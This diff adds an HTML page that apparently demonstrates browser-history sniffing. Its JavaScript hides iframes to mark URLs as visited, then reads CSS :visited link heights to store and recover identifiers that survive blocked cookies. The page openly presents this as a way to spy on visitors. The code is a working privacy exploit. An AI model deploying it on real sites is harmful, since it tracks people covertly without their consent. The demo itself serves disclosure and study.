@@ -1,0 +1,188 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<style type="text/css">
+#scratcharea a {font-size: 10pt;}
+#scratcharea a:visited {font-size: 30pt;}
+#stored tt {border: 1px solid gray;}
+body {
+font-family: verdana, arial, helvetica, sans-serif;
+font-size: 12pt;
+}
+</style>
+<title>Using Browser History to Store "Magic" Cookies</title>
+</head>
+<body onload="loaded();">
+<h1>Using Browser History to Store "Magic" Cookies</h1>
+
+<p>Cookies (and "Flash Cookies") are often blocked. So is there
+  another way to identify and spy on website visitors? Some quite
+  unknown way is to use iframes or a series of redirects to pollute
+  the user's "visited pages" history. Most people do not delete it
+  because they use it on news sites. This information can be read via
+  CSS properties: Put links with a known text into an
+  "<tt>overflow=hidden</tt>" div, use different font sizes for visited
+  and unvisited links, and read the <tt>offsetHeight</tt> of the divs
+  to see whether the link has been visited or not.
+</p>
+<p>For some reason, this does not work in IE (but works well in Firefox
+  and Opera). Testing visited links
+  works perfectly, but making links visited just does not work (it
+  does in some cases, but I could not find any where it works without
+  user interaction). <b>Does anyone know why this does not work in IE
+  and how to "fix" it?</b></p>
+<p>So, disable Javascript? It helps against this demo, but not in
+  practice, because you can use different images for visited and
+  unvisited links and use this on the server to check which image
+  will be loaded (this demo will not
+  demonstrate that).</p>
+<h1>Live Demo</h1>
+<p>Disable cookies, disable everything but Javascript (and don't clear
+your history), and it will still be possible to use this demo.</p>
+<div id="loadarea" style="overflow:hidden;width:0px;height:0px;">
+<iframe src="x.html?paramref"></iframe>
+</div>
+<div id="pleasewait">
+<div id="scratcharea" style="overflow:hidden;width:0px;height:0px;">
+<a id="visitedref" href="main.html">X</a> <a id="unvisitedref"
+href="no:protocol">X</a>
+<a id="paramref" href="x.html?paramtest">X</a></div>
+Please wait... (You will need Javascript enabled...)</div>
+<div id="unvuln" style="visibility: hidden; display:none;">
+Your browser is not vulnerable.
+Please contact me and tell me which browser you used.</div>
+<div id="result" style="visibility: hidden; display:none;">
+<h2>Visits</h2> 
+You have visited/reloaded this page <span id="visitcount">0</span> times.
+<h2>Store strings</h2>
+You may store as many strings as you want. HTML allowed, since you
+will only inject it into your own browser. Really long strings can
+make your browser slow/crash because it will create lots of iframes.
+<form action="javascript:store();">
+<label for="q">Text to store:</label>
+<input type="text" name="q" id="q" value="" /> 
+<input type="button" onclick="store();" value="Store!" />
+</form>
+<h2>Retrieve strings</h2>
+<p>You have stored <span id="storecount">0</span> strings.</p>
+<div id="stored"></div>
+</div>
+<h1>Author</h1>
+<p>schierlm at gmx dot de</p>
+<script type="text/javascript">
+<!--
+var visited = document.getElementById("visitedref").offsetHeight;
+var unvisited = document.getElementById("unvisitedref").offsetHeight;
+var cnt;
+var xhtml="x.html?";
+
+function showDiv(divname) {
+    var div = document.getElementById(divname);
+    div.style.visibility="visible";
+    div.style.display="block";
+}
+function hideDiv(divname) {
+    var div = document.getElementById(divname);
+    div.style.visibility="hidden";
+    div.style.display="none";
+}
+function history_getbit(url) {
+    document.getElementById("scratcharea").innerHTML=
+	'<a id="scratchlink" href="'+url+'">X<\/a>';
+    var cmp = document.getElementById("scratchlink").offsetHeight;
+    if (visited == cmp) return true;
+    if (unvisited == cmp) return false;
+    alert("Huh?" +cmp+" "+visited+" "+unvisited);
+}
+function history_loadbit(url) {
+    document.getElementById("loadarea").innerHTML += 
+	'<iframe src="'+url+'"><\/iframe>';
+}
+function history_gethex(prefix) {
+    var result="";
+    while(!history_getbit(prefix+result+"-ok")) {
+	if (history_getbit(prefix+result+"0")) result+="0";
+	else if (history_getbit(prefix+result+"1")) result+="1";
+	else if (history_getbit(prefix+result+"2")) result+="2";
+	else if (history_getbit(prefix+result+"3")) result+="3";
+	else if (history_getbit(prefix+result+"4")) result+="4";
+	else if (history_getbit(prefix+result+"5")) result+="5";
+	else if (history_getbit(prefix+result+"6")) result+="6";
+	else if (history_getbit(prefix+result+"7")) result+="7";
+	else if (history_getbit(prefix+result+"8")) result+="8";
+	else if (history_getbit(prefix+result+"9")) result+="9";
+	else if (history_getbit(prefix+result+"a")) result+="a";
+	else if (history_getbit(prefix+result+"b")) result+="b";
+	else if (history_getbit(prefix+result+"c")) result+="c";
+	else if (history_getbit(prefix+result+"d")) result+="d";
+	else if (history_getbit(prefix+result+"e")) result+="e";
+	else if (history_getbit(prefix+result+"f")) result+="f";
+	else {alert("Huh? '"+result+"'"); return result;}
+    }
+    return result;
+}
+function history_loadhex(prefix, value) {
+    for(var i=1; i<=value.length; i++) {
+	var tmp = value.substring(0, i);
+	history_loadbit(prefix+tmp);
+    }
+    history_loadbit(prefix+value+"-ok");
+}
+function unhexstring(str) {
+    var result = "";
+    for(var i=0; i< str.length; i+=4) {
+	result += String.fromCharCode(parseInt(str.substring(i, i+4), 16));
+    }
+    return result;
+}
+function hexstring(str) {
+    var result = "";
+    for(var i=0; i < str.length; i++) {
+	var tmp = str.charCodeAt(i).toString(16);
+	while (tmp.length < 4) tmp="0"+tmp; 
+	result +=tmp;
+    }
+    return result;
+}
+function store() {
+    hideDiv("result");
+    showDiv("pleasewait");
+    history_loadhex(xhtml+"string-"+cnt+"-h-", 
+		    hexstring(document.forms[0].q.value));
+    history_loadbit(xhtml+"string-"+cnt+"-available")
+	setTimeout("window.location.reload();",3000);
+}
+
+function loaded() {
+    if (visited != unvisited) {
+	if (!history_getbit(xhtml+"paramref")) {
+	    alert("Huh? Evil iframes :(");
+	    visited=0;
+	    unvisited=0;
+	}
+    }
+    if (visited == unvisited) {
+	showDiv("unvuln");
+    } else {
+	cnt=1;
+	while(history_getbit(xhtml+"visitcount-"+cnt+"")) cnt++;
+	history_loadbit(xhtml+"visitcount-"+cnt+"");
+	document.getElementById("visitcount").innerHTML=cnt;
+	showDiv("result");
+	cnt=0;
+	while(history_getbit(xhtml+"string-"+cnt+"-available")) {
+	    var str = unhexstring(history_gethex(xhtml+"string-"+cnt+"-h-"));
+	    
+	    document.getElementById("stored").innerHTML += 
+		"<p><tt>"+str+"<\/tt><\/p>";
+	    cnt++;
+	}
+	document.getElementById("storecount").innerHTML=cnt;
+    }
+    hideDiv("pleasewait");
+}
+// -->
+</script>
+</body>
+</html>
